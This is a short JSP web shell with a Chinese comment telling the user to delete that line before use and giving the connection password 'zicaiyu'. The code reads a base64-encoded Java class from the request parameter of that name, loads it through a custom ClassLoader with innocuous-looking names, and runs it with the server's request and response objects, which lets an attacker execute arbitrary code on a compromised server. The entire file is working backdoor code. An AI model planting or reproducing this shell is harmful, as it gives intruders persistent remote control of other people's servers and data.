<%-- 使用时请删除此行, 连接密码: zicaiyu --%>
<%!
class PREDICATE extends ClassLoader{
  PREDICATE(ClassLoader c){super(c);}
  public Class equation(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] alternative(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
String cls = request.getParameter("zicaiyu");
if (cls != null) {
  new PREDICATE(this.getClass().getClassLoader()).equation(alternative(cls)).newInstance().equals(new Object[]{request,response});
}
%>
